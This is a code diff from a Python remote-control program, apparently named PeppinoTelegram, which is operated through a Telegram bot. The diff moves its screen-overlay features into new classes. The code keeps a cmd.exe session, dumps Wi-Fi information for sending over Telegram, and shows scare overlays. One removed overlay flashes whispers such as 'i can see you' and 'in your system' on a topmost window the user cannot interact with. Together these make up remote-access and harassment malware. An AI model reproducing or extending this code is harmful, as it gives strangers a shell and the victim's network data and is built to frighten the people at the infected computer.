@@ -8,7 +8,7 @@ If you lose control of your telegram bot, you could potentially lose the control
 """
 
 
-__version__ = "2.23.2"
+__version__ = "2.50" # I kinda forget about this every 10 commits but its kinda funny at this point
 
 
 #TELEGRAM
@@ -356,10 +356,12 @@ class PeppinoTelegram:
         self.cantopenmenu_ref = None
         self.mainmenu_ref = None
 
+        self.overlay_tk = OverlayManager(self, BURN_DIRECTORY)
+        self.overlay_opencv = OpenCVOverlayPlayer()
+
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
 
-        self.hdmiDrownerOverlayPlayer: HDMIDrownedOverlay = HDMIDrownedOverlay()
         self.bars: dict[int:LoadingBar] = {}
 
         self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
@@ -1352,48 +1354,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"Invalid command {command}")
     
     def parse_video_note(self, saved_filepath: str) -> None:
-        # VIDEOPART - Setup
-        cap = VideoCapture(saved_filepath)
-        fps = cap.get(CAP_PROP_FPS)
-        if fps <= 0:
-            fps = 30
-        frame_delay = int(1000 / fps)
-
-        namedWindow("Video", WINDOW_NORMAL)
-        setWindowProperty("Video", WND_PROP_TOPMOST, 1)
-
-        # AUDIOPART - Extract and play audio
-        temp_audio_file = join(BURN_DIRECTORY, f"{randomname()}.wav")
-        try:
-            video_clip = VideoFileClip(saved_filepath)
-            audio_clip = video_clip.audio
-            if audio_clip is not None:
-                audio_clip.write_audiofile(temp_audio_file, logger=None)
-                play_wav(temp_audio_file)
-                audio_clip.close()
-            video_clip.close()
-        except:
-            pass
-
-        # VIDEOPART - PLaying the actual frames
-        while True:
-            ret, frame = cap.read()
-            if not ret:
-                break
-            resizeWindow("Video", frame.shape[1], frame.shape[0])
-            imshow("Video", frame)
-            waitKey(frame_delay)
-
-        cap.release()
-        destroyAllWindows()
-        
-        # Cleanup audio file
-        if exists(temp_audio_file):
-            sleep(2)
-            try:
-                remove(temp_audio_file)
-            except:
-                pass
+        self.overlay_tk.video_note_overlay(saved_filepath)
 
     def parse_video(self, msg, document, saved_filepath: str, saved_filename: str) -> None:
         caption = msg["caption"].lower().strip()
@@ -1569,118 +1530,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         loading_bar.fill_and_delete()
 
     def whisper_overlay(self, duration: int, whispers: str | list[str] | None = None) -> None:
-        if whispers is None:
-            whispers = [
-                "can you hear me",
-                "i'm here",
-                "look behind you",
-                "don't turn around",
-                "i can see you",
-                "you're not alone",
-                "the screen",
-                "close your eyes",
-                "i'm in the room",
-                "check the door",
-                "someone's behind you",
-                "don't look",
-                "i know you're there",
-                "your reflection",
-                "the window",
-                "i'm watching",
-                "not alone",
-                "behind the screen",
-                "in your system",
-                "can you see me",
-                "turn around",
-                "i'm closer",
-                "the darkness",
-                "your shadow",
-                "in the corner",
-                "don't scream",
-                "it's me",
-                "behind you",
-                "i'm inside",
-                "the silence"
-            ]
-        else:
-            if isinstance(whispers, str):
-                whispers = whispers.split(",")
-        
-        # Create thread for the overlay
-        def run_overlay():
-            root = Tk()
-            root.title("overlay")
-            WIN_W = 250
-            WIN_H = 30
-            screen_w = root.winfo_screenwidth()
-            screen_h = root.winfo_screenheight()
-            
-            x = screen_w - WIN_W - 10
-            y = screen_h - WIN_H - 10
-            
-            root.geometry(f"{WIN_W}x{WIN_H}+{x}+{y}")
-            root.overrideredirect(True)
-            
-            root.attributes("-transparentcolor", "black")
-            root.config(bg="black")
-            label = Label(
-                root,
-                text="",
-                fg="#8B0000",
-                bg="black",
-                font=("Segoe UI", 9)
-            )
-            label.pack(expand=True)
-            
-            root.wm_attributes("-topmost", 1)
-            root.wm_attributes("-disabled", 1)
-            
-            start_time = time()
-            current_whisper = None
-            last_change = 0
-            whisper_loading_bar = self.new_loading_bar(duration, label="👻 Whisper Overlay")
-            if whisper_loading_bar.canceled:
-                whisper_loading_bar.fill_and_delete()
-                return
-            
-            def update_whisper():
-                nonlocal current_whisper, last_change
-                current_time = time()
-                whisper_loading_bar.update(current_time-start_time)
-                if whisper_loading_bar.canceled:
-                    whisper_loading_bar.fill_and_delete()
-                    return
-                if current_time - last_change > uniform(2, 5):
-                    current_whisper = choice(whispers)
-                    label.config(text=current_whisper)
-                    last_change = current_time
-                    
-                    if random() < 0.3:
-                        for alpha in [0.3, 0.7, 1.0, 0.7, 0.3, 0.1]:
-                            try:
-                                root.attributes("-alpha", alpha)
-                                root.update()
-                                sleep(0.05)
-                            except:
-                                break
-                        root.attributes("-alpha", 1.0)
-                
-                if current_time - start_time < duration:
-                    root.after(100, update_whisper)
-                else:
-                    for alpha in [1.0, 0.7, 0.4, 0.1, 0.0]:
-                        try:
-                            root.attributes("-alpha", alpha)
-                            root.update()
-                            sleep(0.1)
-                        except:
-                            break
-                    root.destroy()
-                    whisper_loading_bar.fill_and_delete()
-            root.after(100, update_whisper)
-            root.mainloop()
-        
-        run_overlay()
+        self.overlay_tk.whisper_overlay(duration, whispers)
 
     def knockknock(self) -> None:
         self.__play_loaded_sound("knockknock")
@@ -2280,20 +2130,8 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
     def wifiinfo(self) -> None:
         self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")
 
-    def _wrapper_for_hdmi_overlay(self, timeout_seconds: int, player: HDMIDrownedOverlay) -> None:
-        loading_bar = self.new_loading_bar(timeout_seconds, label="️🌀 Video Signal Drowning Effect")
-        start = time()
-        Thread(target=player.run, args=(timeout_seconds, )).start()
-        while (time()-start) < timeout_seconds:
-            if loading_bar.canceled:
-                break
-            loading_bar.update(time()-start)
-            sleep(1)
-        loading_bar.fill_and_delete()
-        player.stop()
-
     def wrapper_for_hdmi_overlay(self, timeout_seconds: int) -> None:
-        Thread(target=self._wrapper_for_hdmi_overlay, args=(timeout_seconds,self.hdmiDrownerOverlayPlayer)).start()
+        Thread(target=self.overlay_opencv.run(timeout_seconds)).start()
 
     def disturbed_overlay_and_random_noise(self, duration: int) -> None:
         self.wrapper_for_hdmi_overlay(duration)
